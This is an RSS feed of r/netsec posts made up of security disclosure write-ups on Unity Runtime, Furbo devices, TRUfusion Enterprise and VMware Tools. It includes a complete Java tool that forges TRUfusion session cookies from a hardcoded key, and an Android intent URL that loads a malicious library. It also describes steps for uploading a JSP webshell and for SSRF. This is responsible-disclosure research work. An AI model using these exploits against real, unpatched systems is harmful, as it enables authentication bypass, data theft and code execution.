<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit - NetSec</title><link>https://krisbogaerts.github.io/news-securehub</link><description></description><item><title>CVE-2025-59489: Arbitrary Code Execution in Unity Runtime</title><link>https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/</link><author>/u/toyojuni</author><category>netsec</category><pubDate>Fri, 3 Oct 2025 05:06:20 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
      Posted on 
  
    October 3, 2025
  


      
         • 
      
      
      6 minutes
       •
      
      1067 words
      
    Hello, I’m RyotaK
 (@ryotkak
), a security engineer at GMO Flatt Security Inc.In May 2025, I participated in the Meta Bug Bounty Researcher Conference 2025.

During this event, I discovered a vulnerability (CVE-2025-59489) in the Unity Runtime that affects games and applications built on Unity 2017.1 and later.In this article, I will explain the technical aspects of this vulnerability and its impact.This vulnerability was disclosed to Unity following responsible disclosure practices.
Unity has since released patches for Unity 2019.1 and later, as well as a Unity Binary Patch tool to address the issue, and I strongly encourage developers to download the updated versions of Unity, recompile affected games or applications, and republish as soon as possible.We appreciate Unity’s commitment to addressing this issue promptly and their ongoing efforts to enhance the security of their platform.
Security vulnerabilities are an inherent challenge in software development, and by working together as a community, we can continue to make software systems safer for everyone.A vulnerability was identified in the Unity Runtime’s intent handling process for Unity games and applications.
This vulnerability allows malicious intents to control command line arguments passed to Unity applications, enabling attackers to load arbitrary shared libraries ( files) and execute malicious code, depending on the platform.In its default configuration, this vulnerability allowed malicious applications installed on the same device to hijack permissions granted to Unity applications.
In specific cases, the vulnerability could be exploited remotely to execute arbitrary code, although I didn’t investigate third-party Unity applications to find an app with the functionality required to enable this exploit.Unity has addressed this issue and has updated all affected Unity versions starting with 2019.1. Developers are strongly encouraged to download them,
 recompile their games and applications, and republish to ensure their projects remain secure.Unity is a popular game engine used to develop games and applications for various platforms, including Android.According to Unity’s website, 70% of top mobile games are built with Unity. This includes popular games like Among Us and Pokémon GO, along with many other applications that use Unity for development. During the analysis, I used Android 16.0 on the Android Emulator of Android Studio. The behavior and impact of this vulnerability may differ on older Android versions.To support debugging Unity applications on Android devices, Unity automatically adds a handler for the intent containing the  extra to the UnityPlayerActivity. This activity serves as the default entry point for applications and is exported to other applications.As documented above, the  extra is parsed as command line arguments for Unity.While Android’s permission model manages feature access by granting permissions to applications, it does not restrict which intents can be sent to an application.
This means any application can send the  extra to a Unity application, allowing attackers to control the command line arguments passed to that application.After loading the Unity Runtime binary into Ghidra, I discovered the following command line argument:The value of this command line argument is later passed to , causing the path specified in  to be loaded as a native library.This behavior allows attackers to execute arbitrary code within the context of the Unity application, leveraging its permissions by launching them with the -xrsdk-pre-init-library argument.Any malicious application installed on the same device can exploit this vulnerability by:Extracting the native library with the android:extractNativeLibs attribute set to  in the AndroidManifest.xmlLaunching the Unity application with the  argument pointing to the malicious libraryThe Unity application would then load and execute the malicious code with its own permissionsRemote Exploitation via BrowserIn specific cases, this vulnerability could potentially be exploited remotely although the condition .
For example, if an application exports  or  with the android.intent.category.BROWSABLE category (allowing browser launches), websites can specify extras passed to the activity using intent URLs:intent:#Intent;package=com.example.unitygame;scheme=custom-scheme;S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
At first glance, it might appear that malicious websites could exploit this vulnerability by forcing browsers to download  files and load them via the  argument.However, Android’s strict SELinux policy prevents  from opening files in the downloads directory, which mitigates almost all remote exploitation scenarios.library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed 
or dlopened by "/data/app/~~24UwD8jnw7asNjRwx1MOBg==/com.DefaultCompany.com.unity.template. 
mobile2D-E043IptGJDwcTqq56BocIA==/lib/arm64/libunity.so" is not accessible for the 
namespace: [name="clns-9", ld_library_paths="",default_library_paths="/data/app/~~24UwD8jnw7asNjRwx1MOBg==/com.DefaultCompany.com.unity.template. 
mobile2D-E043IptGJDwcTqq56BocIA==/lib/arm64:/data/app/~~24UwD8jnw7asNjRwx1MOBg==/com.DefaultCompany.com.unity.template.mobile2D-E043IptGJDwcTqq56BocIA==/base.apk!/lib/arm64-v8a", permitted_paths="/data:/mnt/expand:/data/data/com.DefaultCompany.com.unity.template.mobile2D"]
That being said, since the  directory is included in , if the target application writes files to its private storage, it can be used to bypass this restriction.Furthermore,  doesn’t require the  file extension. If attackers can control the content of a file in an application’s private storage, they can exploit this vulnerability by creating a file containing malicious native library binary. This is actually a common pattern when applications cache data.Requirements for Remote ExploitationTo exploit this vulnerability remotely, the following conditions must be met:The application exports  or  with the android.intent.category.BROWSABLE categoryThe application writes files with attacker-controlled content to its private storage (e.g., through caching)Even without these conditions, local exploitation remains possible for any Unity application.In this article, I explained a vulnerability in Unity Runtime that allows arbitrary code execution in almost all Unity applications on Android.I hope this article helps you understand that vulnerabilities can exist in the frameworks and libraries you depend on, and you should always be mindful of the security implications of the features you use.At GMO Flatt Security, we provide top-notch penetration testing for a wide range of targets, from Web apps to IoT devices.We also developed Takumi, our AI security engineer. It’s an autonomous agent that finds vulnerabilities in source code and has already discovered CVEs in major libraries like Vim and Next.js.
https://flatt.tech/en/takumiRecently, we’ve expanded Takumi’s capabilities. It’s no longer just a SAST (white-box testing) tool; we’ve added DAST (black-box testing) to enable high-fidelity gray-box scanning for more accurate results.Based in Japan, we work with clients globally, including industry leaders like Canonical Ltd.]]></content:encoded></item><item><title>Nuclei Templates for Detecting AMI MegaRAC BMC Vulnerabilities</title><link>https://eclypsium.com/blog/eclypsium-releases-tools-for-detecting-ami-megarac-bmc-vulnerabilities/</link><author>/u/TechDeepDive</author><category>netsec</category><pubDate>Wed, 1 Oct 2025 21:47:34 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>r/netsec monthly discussion &amp; tool thread</title><link>https://www.reddit.com/r/netsec/comments/1nv88jp/rnetsec_monthly_discussion_tool_thread/</link><author>/u/albinowax</author><category>netsec</category><pubDate>Wed, 1 Oct 2025 13:29:30 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Questions regarding netsec and discussion related directly to netsec are welcome here, as is sharing tool links.Always maintain civil discourse. Be awesome to one another - moderator intervention will occur if necessary.Avoid NSFW content unless absolutely necessary. If used, mark it as being NSFW. If left unmarked, the comment will be removed entirely.If linking to classified content, mark it as such. If left unmarked, the comment will be removed entirely.Avoid use of memes. If you have something to say, say it with real words.All discussions and questions should directly relate to netsec.No tech support is to be requested or provided on r/netsec.As always, the content & discussion guidelines should also be observed on r/netsec.Feedback and suggestions are welcome, but don't post it here. Please send it to the moderator inbox.]]></content:encoded></item><item><title>IPv4/IPv6 Packet Fragmentation: Implementation Details - PacketSmith</title><link>https://packetsmith.ca/ipv4-ipv6-packet-fragmentation/</link><author>/u/MFMokbel</author><category>netsec</category><pubDate>Wed, 1 Oct 2025 13:20:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In release v2.0, we’ve shipped PacketSmith with support for IPv4/IPv6 fragmentation detection and reassembly. Additionally, we’ve detailed some of the implementation details in the public article ““. In version 3.0, we’ve shipped a full IPv4 and IPv6 packet fragmenter that can be invoked via the option IPv4 fragmentation logic is simpler to implement than IPv6’s. This is because IPv6 fragmentation requires careful handling of IPsec extensions and strict attention to the placement (or injection order) of the fragmentation header relative to other potential packet extensions.You can  a packet capture’s packets at the IP level using a specific MTU (Maximum Transmission Unit) value. For IPv4 and IPv6, fragmentation is based on the header’s total length, such that if it exceeds the MTU, the  packet is fragmented (split into multiple IPv4/IPv6 packets) and replaced with the .: The checksum for each IP fragment can only be computed if the IP reassembly function is disabled. The default network behaviour is to reassemble fragments, so you must explicitly disable this using the  flag.: The following definitions are used throughout the article:The  is the packet to be fragmented. are the fragmented packets of the .: To prevent console clutter from potentially hundreds of messages, error reporting for packet fragmentation failures is kept minimal. This applies whether the packet didn’t meet the fragmentation criteria or failed for another reason.For IPv4, the MTU is defined as the maximum size of a packet, including the IP header and the payload; fragmentation can occur at either the host or the router.When fragmenting an IPv4 packet that meets the MTU threshold, none of the layers before the IP layer is “considered”.  The maximum fragment payload is derived as follows: = floor( (mtu – ip_header_len) / 8 ) * 8The  is the IPv4 header length, including any options.The  is the IPv4 header length plus the IPv4 payload size.The number of fragments is determined with the following equation: = ceil(total_ip_payload_len / max_frag_payload_size)The  is the IPv4  field, which holds the length of the IPv4 header (including options) and the IPv4 payload size.For calculating the last fragment payload length, the following equation is applied: = total_ip_payload_len – (num_of_frags – 1) * max_frag_payload_sizeSome of the conditions applied when processing a packet for fragmentation include:If the IPv4  flag is set, then the packet is skippedIf the IPv4 header is a 4-in-6 encapsulated header, then the packet is skippedIPv4 header length cannot be greater than the provided MTU valueIPv4 header:  and  flags are set appropriately for each of the fragment packetsThe IPv4 identification value for all fragment packets is inherited from the original packetPayload size must be a multiple of 8 except for the last fragment packetThe packet’s original and captured length are updated accordingly to reflect the actual size of the packetAll the fragment packets inherit the same layers up to the IPv4 network layer of the original packetWhen an IP packet is protected by IPsec, using Authentication Header (AH) and/or Encapsulation Security Payload (ESP), the AH and ESP headers are treated as part of the upper-layer payload. Therefore, fragmentation is performed on the entire IPsec-protected packet.Once a packet is fragmented successfully, the original packet is replaced with the fragment packets. Internally, PacketSmith fragments all packets by storing their respective fragment frames in a separate buffer using a std::map data structure, with the key being the original packet frame number/id. Once fragmentation is complete, we derive the relative index to the original packet with respect to the number of fragment packets replacing it, inject the fragments, and then delete the original packet. No temporary pcap is created. This all happens in-memory and in-place.IPv4 Fragmentation ExampleConsider the following PCAP example : It contains one packet with an IPv4 header that includes the following information:Internet Protocol Version 4, Src: 192.168.2.14, Dst: 66.235.200.1470100 .... = Version: 4 (5)Differentiated Services Field: 0x00 (DSCP: CS0, ECN: Not-ECT)0000 00.. = Differentiated Services Codepoint: Default (0).... ..00 = Explicit Congestion Notification: Not ECN-Capable Transport (0): Identification: 0xff29 (65321)0... .... = Reserved bit: Not set..0. .... = More fragments: Not set...0 0000 0000 0000 = Fragment Offset: 0Time to Live: 128Header Checksum: 0x67c5 [correct]Source Address: 192.168.2.14Destination Address: 66.235.200.147Let’s fragment this packet with an MTU of 512, using the following PacketSmith option:The expectation from executing the above command with respect to the equations defined earlier is as follows: = floor( (512 – 20) / 8) * 8 = 488 = ceil(1492 / 488) = 4 = 1492 – (4 – 1) * 488 = 1492 – 1464 = 28The resulting PCAP has been attached as . All of the fragment packets got incorrect checksums; to fix them, we execute the following command, with the  flag as mentioned in the introduction in Note-1.The IPv4 fields in Figure 1 match the equations’ numbers. Note that for the Fragment Offset (FO), you need to multiply it by 8.Fragmenting an IPv6 packet is more subtle and requires careful consideration of various rules and conditions for a successful operation, since this entails the injection of a fragment extension in a specific order. The minimum MTU value for IPv6 fragmentation is 1280 bytes; however, PacketSmith doesn’t enforce this limit, instead setting the minimum to 48 (IPv6 header length/40 + fragment extension length/8). You should avoid setting this value too low. If the setting doesn’t satisfy the upper-layer protocol’s minimum length condition, the protocol dissector will encounter errors during parsing.Some of the conditions applied when processing a packet for fragmentation include:If the IPv6  already exists, then the packet is skipped Each extension header should occur at most once, except for the Destination Options header, which should occur at most twice (once before a Routing header and once before the upper-layer header).If the IPv6 header is a 6-in-4 encapsulated header, then the packet is skipped(IPv6 payload length + header length) cannot be greater than the provided MTU valueThe IPv6 fragment extension is constructed in-place and inserted into every fragment packet The identification field is pseudo-randomly generated for all fragment packets of the original packet and  flags are set appropriately for each of the fragment packetsPayload size must be a multiple of 8 except for the last fragment packetThe packet’s original and captured length are updated accordingly to reflect the actual size of the packetAll the fragment packets inherit the same layers up to the IPv6 network layer of the original packetWhen an IP packet is protected by IPsec, using Authentication Header (AH) and/or Encapsulation Security Payload (ESP), the ESP header is treated as part of the upper-layer payload. All other extension headers are carried over with every fragment packet.“When more than one extension header is used in the same packet, it is recommended that those headers appear in the following order:Hop-by-Hop Options headerDestination Options header (note 1)Authentication header (note 2)Encapsulating Security Payload header (note 2)Destination Options header (note 3)The ESP header isn’t a standard IPv6 extension; it’s an upper-layer protocol. PacketSmith is designed to parse IPv6 packets with these headers correctly.Once a packet is fragmented successfully, the original packet is replaced with the fragment packets; the same process as with IPv4 fragmentation.The same equations listed above apply here with the IPv6 version. IPv6 Fragmentation ExampleInternet Protocol Version 6, Src: fe80::222:22ff:fe22:2222, Dst: ff02::50110 .... = Version: 6.... 1110 0000 .... .... .... .... .... = Traffic Class: 0xe0 (DSCP: CS7, ECN: Not-ECT).... 1110 00.. .... .... .... .... .... = Differentiated Services Codepoint: Class Selector 7 (56).... .... ..00 .... .... .... .... .... = Explicit Congestion Notification: Not ECN-Capable Transport (0).... 0000 0000 0000 0000 0000 = Flow Label: 0x00000Next Header: Hop Limit: 1Source Address: fe80::222:22ff:fe22:2222Destination Address: ff02::5[Source SLAAC MAC: Schaffne_22:22:22 (00:22:22:22:22:22)][Stream index: 0]As shown above, the  is set to 68, which is the length of the ESP upper-layer protocol “extension”. The IPv6 header is a fixed 40 bytes with no extensions. The Next Header field points to the upper-layer protocol “extension”, that’s ESP (50).Let’s fragment this packet with an MTU of 64, using the following PacketSmith option:The expectation from executing the above command with respect to the equations defined earlier is as follows: = floor( (64 – 40) / 8) * 8 = 24
Actually, the effective fragment payload size is 16 bytes and not 24, since for every fragment packet, an 8-byte fragment extension is added. We’re subtracting the fragment size from the max_frag_payload_size. = ceil(108/ 24) = 5
The  in the IPv6 header represents the header length, plus the length of any extensions that might exist, and the length of the IPv6 payload. In this case, it is: (40 + 0 + 68) = 108 bytes. = 108 – (5 – 1) * 24 = 12The resulting PCAP has been attached as , with the following screenshot:The fragment extension has been added to every fragment packet, as shown in Figure 2, under the column “Fragment Header for IPv6”. The offsets in the IPv6 fragment extension in Figure 2 match the equations’ numbers. The original packet doesn’t carry any extension other than the ESP upper-layer protocol; therefore, the fragment extension is the only extension that exists in the fragment packets.The following is a gallery of details of all 5 IPv6 fragment packets shown in Figure 2:]]></content:encoded></item><item><title>Software Secured | Hacking Furbo 2: Mobile App and P2P Exploits | USA</title><link>https://www.softwaresecured.com/post/hacking-furbo-a-hardware-research-project-part-2-mobile-and-p2p-exploits</link><author>/u/duduywn</author><category>netsec</category><pubDate>Wed, 1 Oct 2025 01:43:53 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In the second part of our Hacking Furbo blog series we will focus on the mobile application and P2P communications from it. We will detail our process of identifying the mobile-side of the P2P communications and hooking them with Frida for a deeper understanding of how they work.Mobile Application OverviewThe Furbo mobile application is where all of the magic happens for a device owner. From here you can configure your device, surveil your pet, and toss treats (on the Furbo 360). They have also added, as many companies unfortunately do these days, an AI chat feature which allows you to get advice about your pet and query data.Pulling the app down with adb, we gave it a quick run through MobSF to pick up any low hanging fruit and found that there was surprisingly little to report on from that review.We also performed some mobile-specific tests, looking at things like exported services, service providers, activities and the like, without much success. We were able to get one finding from this however: insecure storage of sensitive information in the device's memory.When you are assessing a mobile application and its handling of sensitive information in memory you must first identify several things you'd like to hunt for. As we would learn in the subsequent sections of this article, the Furbo device and mobile app perform some authentication to each other. We could see some of the API requests to the Furbo servers which initiated this authentication flow in the proxy history. These would be a valuable target.Additionally, there were the CognitoTokens which were used to authenticate each request which we could hunt for. Any of these being found in memory could mean that an attacker could retrieve it and re-use it to take over the victim's account or Furbo device.So, to test this we would have to do the following on a jail broken Android device with Frida installed:While running a web proxy to capture the values in the API calls, open the mobile application and authenticate.Navigate around the app, connecting to the device, making changes, etc.Copy the values of any sensitive parameters such as the P2P or Cognito authentication tokens.Close the application by swiping up to terminate it.On our host machine, while connected with adb run: fridump3 -v -u -s FurboThis creates a dump of the device's memory in its current state. In a perfectly configured app, no sensitive information should reside in memory after the application has been terminated. Once the dump is completed we navigate into the output directory and grep for some of those previously identified sensitive details from the web proxy history.Grepping through the Fridump output directory, we found that each of these aforementioned values have been stored in memory, after the application has been logged out from and terminated.Next, we focused our attention on identifying how the device and the mobile application communicated with each other. We knew a few things, the device was communicating outbound over UDP port 10001, we found several Shared Object Libraries referencing TUTK, and we had seen some references to TUTK in the UART logs. All of this helped us determine that the P2P communication protocol in use was ThroughTek's Kalay Platform, from here on out we'll simply refer to it as TUTK P2P since that is how it was referenced in the code for the Furbo device and mobile application.  This was a drastic change in direction from the previous research we had seen. For those unfamiliar with the work of SomersetRecon, they had done a review in 2021 of the Furbo 2.5 and first edition of the Furbo Mini in a three part blog series, the first part can be found here. These devices were relying upon a RTSP stream to allow owners to view their cameras. Unfortunately for us the TUTK P2P protocol is much more secure and has far less public documentation available.We spent quite a number of hours looking for public documentation on the protocol and came up with little. What we did find was that a researcher who goes by Kroo had released a Python library which could be used to communicate with Wyzecam devices, which also use TUTK P2P. This wouldn't exactly work for us—the level of effort to get it ported to Furbo wasn't reasonable for our research. We also came across some great research done by Mandiant into the protocol itself in 2021 which resulted in some huge headlines. Mandiant's paper which details this research, "Mandiant Discloses Critical Vulnerability Affecting Millions of IoT Devices" can be found here. We attempted to reach out to the authors of this report in the hopes that they may be able to shed some additional light on their exploits but to no avail.In spite of this, we were able to glean a lot of information as the research was very detailed and gave us a far better understanding about how these communications worked. Seen below is an illustration, taken from their research paper, of how devices, mobile apps, and the Kalay network communicate with each other.Based on this, we decided (after spending quite a bit of time trying to set up our own Python implementation) to forego the hard path and stick to something a bit easier instead: hooking the communications from the mobile application with Frida which could allow us to monitor and tamper with the traffic.Reversing the P2P CommunicationsAs we now knew the protocol in use, we decided to try to find the files which handled the P2P communications from the decompiled application. This would allow us to understand the command structure, the expected inputs, and to see if there were any hidden features, all of which would help us once we hooked the functions.We found that the TUTK files resided under ./sources/com/tutk/, fairly straight forward and easy to guess.Then, grepping for some of the various names we saw in the UART logs we found that the P2P command handling is implemented in the files which reside in: /sources/com/tomofun/furbo/device/p2p/cmdAfter having reviewed each of these, our best guess was that the FurboP2pCmdImplTutkV3.java was what we would need to hook. This was because within this file we found the names of each P2P command as well as their definitions which explained what was expected for input. Seen below is one of the commands which we will return to later. With all of this information in tow, we used ChatGPT to generate a couple of Frida scripts with each having varying degrees of success. After a lot of debugging, a common experience for us when doing this kind of stuff with any LLM, we were able to get a working hook on the FurboP2pCmdImplTutkV3 function. With this Frida script we could monitor the content of the outbound and inbound communications between the device and mobile application.Much of what we saw was quite basic, a command was issued, a confirmation of that command was received, without much data being sent in the payload of the request. This was not true for all commands though. The first device we had purchased for our research was the top of the line Furbo 360, which allowed you to toss treats at your pets which were accompanied with a noise. This noise could be customized in the mobile application to be a recording of anything! This sound could be configured from the device settings page. While hooked, we decided to record our own sound and change the treat toss noise. This resulted in the following command being issued. Each recording would result in a request to obtain an S3 pre-signed URL, where the recording would be then uploaded, and finally the link was sent to the Furbo device where it would be retrieved and saved. Now, this was very, very interesting.Using another Frida script, we re-hooked the same function but this time wrote it to replace any URLs sent in a command with a URL which we specified. Our hope with this was that we could get an arbitrary file upload to the device.And, we were successful! We could have the Furbo 360 make a GET request to our specified URL. SSRF to... Darude Sandstorm?We wanted to better understand how this was working and determine if we could elevate this SSRF into something a bit better. For that we would need to find the binary and the corresponding function which handled the request and saved the output. From our limited review of the binaries within the root filesystem in the previous article, we guessed it would likely be contained within the p2p_manager binary.Our guess was right; this was all handled by the tfp2p_cmd_handler_receive_command function within the p2p_manager binary. When the command with the URL was received, no checks were performed on the URL and the device would download the file, unfortunately though it would  be saved as custom.wav. Meaning, we could not use this technique to upload a new firmware file or a reverse shell for execution. The only other hope was that the wav file parser would be written incorrectly, perhaps enabling us to do something like a buffer overflow. However, reviewing the function which handled this yielded no obvious routes to exploitation, the Tomofun development team did an excellent job handling all possibilities for this file—a consistent pain for us across many device functions.So, with remote code execution off the table, what were we to do? Well, our binary analysis revealed that while the file would always be named custom.wav, there was no file size limit. This means we could upload length of sound to the device for playing. With that in mind, we decided that we should get the device to play none other than Darude Sandstorm.Converting a copy of the song to a wav file format, we hosted it on a Python server and sent the command to the device.Denial of Service — Race ConditionWhen hunting for a path to exploit the wav file upload, we found that the function which handled the playing of sounds was single-threaded. This meant that if we sent multiple requests to issue treat toss sounds we may be able to use up all of the threads, and trigger a Denial of Service.Using the previous Frida script as a reference, we modified it to send multiple Treat Toss commands in unison.Once we went into the app and selected the treat toss option from the video feed, a distorted sound would play once. Following that, we could no longer play any noises from the device until it had been rebooted. This may be far from the most exciting vulnerability, and not nearly as fun as the previous, but a vulnerability nonetheless.And so that concludes part two in this six-part blog series. The knowledge we gained from this section regarding the mobile application's inner workings, specifically as it pertains to the P2P communications proved invaluable to us in the rest of our research. While we were unable to compromise the device through this, directly, we were able to gain a more thorough understanding of its authentication scheme, the traffic we were observing on our network, and we even got our Furbo to play Darude Sandstorm, all in all a win in our books.]]></content:encoded></item><item><title>Remote Code Execution and Authentication Bypass in Materialise OrthoView (CVE-2025-23049)</title><link>https://outurnate.com/remote-code-execution-and-authentication-bypass-in-materialise-orthoview-cve-2025-23049</link><author>/u/panicnot42</author><category>netsec</category><pubDate>Tue, 30 Sep 2025 21:40:14 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ZeroDay Cloud: The first open-source cloud hacking competition</title><link>https://zeroday.cloud/</link><author>/u/geekydeveloper</author><category>netsec</category><pubDate>Tue, 30 Sep 2025 18:57:22 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Join the world's top researchers in a competition to find zero-day vulnerabilities in core open-source software powering the cloud. Put your skills to the test, win huge prizes from our $4.5M prize pool, and help make the cloud a safer place.]]></content:encoded></item><item><title>When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise</title><link>https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/</link><author>/u/MrTuxracer</author><category>netsec</category><pubDate>Tue, 30 Sep 2025 18:31:42 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[In early 2025, we encountered a mission-critical software component called TRUfusion Enterprise on the perimeter of one of our customers that is used to transfer highly sensitive data. Since Rocket Software claims that they are undergoing regular audits and also follow secure coding guidelines, we didn’t expect to find much but to our surprise, it took us just two minutes to discover the first totally unsophisticated, but critical pre-auth path traversal vulnerability that already gave us admin rights. What followed next were so many more exploitable vulnerabilities that should have been caught by the vendor’s security standards. All of them are trivial to exploit and don’t need any authentication at all:CVE-2025-27222: Pre-Auth Path Traversal Allowing to Leak Local server files disclosing sensitive clear-text passwordsCVE-2025-27223: Hard-Coded Cryptographic key allowing to forge session cookies that can be used to entirely bypass authenticationCVE-2025-27224: Pre-Auth Path Traversal and arbitrary file write allowing to remotely execute commandsCVE-2025-27225: Pre-Auth sensitive information disclosure of PII (partner and contact names)As of today, the vendor released updates for all affected TRUfusion Enterprise versions to address the vulnerabilities. Review our official security advisories for the version details.CVE-2025-27222: Path Traversal FTW Part 1That’s probably one of the easiest bugs of all and must have been caught by any auditor. We’ve opened the starting page of TRUfusion Enterprise, and immediately spotted a request against the endpoint at /trufusionPortal/getCobrandingData. That endpoint is intended to just return some sort of image for the landing page. However, you could simply add path traversal sequences to the  parameter, which can then be used to traverse through the local file system and read out any file readable by the web server’s user. The file’s contents are then returned in base64 encoding. On this way, it was possible to i.e. read out the Apache server’s access logs:While reviewing the Apache access logs, we noticed that TRUfusion seems to have plenty of endpoints that accept authentication tokens via GET parameters. While we always recommend customers not to transfer authentication tokens via GET parameters because it always gets stored in log files, this specific case proved that it can lead to a critical security vulnerability. In this case, we could simply use the  at the main  endpoint, and it granted us full administrative access to the UI.CVE-2025-27223: Let’s Bake Some Fresh Cookies!This is actually a bug class that we do not encounter regularly nowadays, just because most applications rely on cryptographically secure libraries to generate session IDs. However, it turns out that TRUfusion Enterprise does things differently. TRUfusion uses two cookies called  and . To generate these, TRUfusion uses the hardcoded static IDEA key  to encrypt the authentication cookie. While this is interesting enough, they only encrypt the user’s (numeric) ID to create the session cookies, which means that the same  is reusable across  TRUfusion instances.Here’s a small Java application that can be used to encrypt and decrypt session cookies for any user ID:import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
    private String ideaKey = "1234567890123456";

    public String encode(char[] plainArray) {
        return encode(new String(plainArray));
    }

    public String encode(String plain) {
        IDEAKeyGenerator keygen = new IDEAKeyGenerator();
        IDEA encrypt = new IDEA();

        Key key;
        try {
            key = keygen.generateKey(this.ideaKey.getBytes());
            encrypt.initEncrypt(key);
        } catch (KeyException e) {
            e.printStackTrace();
            return null;
        }

        if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
            for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt
                    .getInputBlockSize(); currentPad++) {
                plain = plain + " ";
            }
        }
        byte[] encrypted = encrypt.update(plain.getBytes());
        return Hex.toString(encrypted);

    }

    public String decode(String chiffre) {
        IDEAKeyGenerator keygen = new IDEAKeyGenerator();
        IDEA decrypt = new IDEA();

        Key key;
        try {
            key = keygen.generateKey(this.ideaKey.getBytes());
            decrypt.initDecrypt(key);
        } catch (KeyException e) {
            e.printStackTrace();
            return null;
        }

        byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
        String str1;
        try {
            str1 = new String(decrypted, "ISO_8859-1");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
            return null;
        }
        String res = str1.trim();
        return res;

    }

    public void setKey(String key) {
        this.ideaKey = key;
    }

    public static void main(String[] args) {
        if (args.length >= 1 && args.length <= 2) {
            try {
                App chiffre = new App();
                if (args.length == 2 && args[1].equalsIgnoreCase("decode")) {
                    String decrypted = chiffre.decode(args[0]);
                    System.out.println(decrypted);
                } else {
                    String encrypted = chiffre.encode(args[0]);
                    System.out.println(encrypted);
                }
                return;
            } catch (Throwable t) {
                t.printStackTrace();
                return;
            }
        }
        System.out.println("Usage: <text> [encode|decode]");
    }
}So the authentication cookie for the user 1 is: FEF2DF1C36FFF2E3, for user 2: 94A0D199D8B822AB etc.CVE-2025-27224: Path Traversal FTW Part 2Another endpoint, another pre-auth path traversal vulnerability, but this time in combination with an arbitrary file write. Jackpot. The endpoint at /trufusionPortal/fileupload is a typical file upload endpoint, where you’ll give it the file contents you want to write as GZIP’ed request body – kudos to the Hackvertor BurpSuite extension, which makes the exploitation trivially easy.The exciting part is that it uses the  and  parameters to construct the path where the file will be saved on the remote file system. Paired with a path traversal within the  parameter allows writing any file with any content anywhere on the file system, where the web server user has access to. You can simply point it to TRUfusion’s web portal path at /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/:Your fancy shell is afterwards accessible at /trufusionPortal/jsp/1~rcesec.jsp:CVE-2025-27225: Massive PII DisclosureAnother easy to catch pre-auth vulnerability affects the endpoint at /trufusionPortal/jsp/internal_admin_contact_login.jsp. This endpoint returns a massive list of PII that contains all the partners that have access to the TRUfusion instance:In this blog post, we examined a software solution designed to transfer highly sensitive files: a product that its vendor claims undergoes regular internal and external audits and also follows secure coding guidelines. Ordinarily, these audits should make the discovery of vulnerabilities significantly more challenging, and in most cases, that assumption holds true. However, our findings indicate that in this case, the audits were at least ineffective.Another major challenge we encountered was the vulnerability coordination process. Although the vendor operates an unpaid Vulnerability Disclosure Program (VDP), one might expect them to have a mature and well-defined process for handling security reports. Instead, as reflected in our advisory timelines, the coordination process was marked by repeated back-and-forth communication and several ignored messages.This highlights a key takeaway: effective software security requires not just audits, but targeted penetration testing conducted by experienced professionals. At RCE Security, we prioritize delivering actionable zero-day research to help our customers mitigate risk, improve resilience, and stay ahead of evolving cyber threats.]]></content:encoded></item><item><title>You name it, VMware elevates it (CVE-2025-41244)</title><link>https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/</link><author>/u/rkhunter_</author><category>netsec</category><pubDate>Tue, 30 Sep 2025 10:38:17 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[The vulnerability impacts both the VMware Tools and VMware Aria Operations. When successful, exploitation of the local privilege escalation results in unprivileged users achieving code execution in privileged contexts (e.g., ).Throughout its incident response engagements, NVISO determined with confidence that UNC5174 triggered the local privilege escalation. We can however not assess whether this exploit was part of UNC5174’s capabilities or whether the zero-day’s usage was merely accidental due to its trivialness. UNC5174, a Chinese state-sponsored threat actor, has repeatedly been linked to initial access operations achieved through public exploitation.Organizations relying on the VMware hypervisor commonly employ the VMware Aria Suite to manage their hybrid‑cloud workloads from a single console. Within this VMware Aria Suite, VMware Aria Operations is the component that provides performance insights, automated remediation, and capacity planning for the different hybrid‑cloud workloads. As part of its performance insights, VMware Aria Operations is capable of discovering which services and applications are running in the different virtual machines (VMs), a feature offered through the Service Discovery Management Pack (SDMP).The discovery of these services and applications can be achieved in either of two modes:The legacy credential-based service discovery relies on VMware Aria Operations running metrics collector scripts within the guest VM using a privileged user. In this mode, all the collection logic is managed by VMware Aria Operations and the guest’s VMware Tools merely acts as a proxy for the performed operations.The credential-less service discovery is a more recent approach where the metrics collection has been implemented within the guest’s VMware Tools itself. In this mode, no credentials are needed as the collection is performed under the already privileged VMware Tools context.As part of its discovery, NVISO was able to confirm the privilege escalation affects both modes, with the logic flaw hence being respectively located within VMware Aria Operations (in credential-based mode) and the VMware Tools (in credential-less mode). 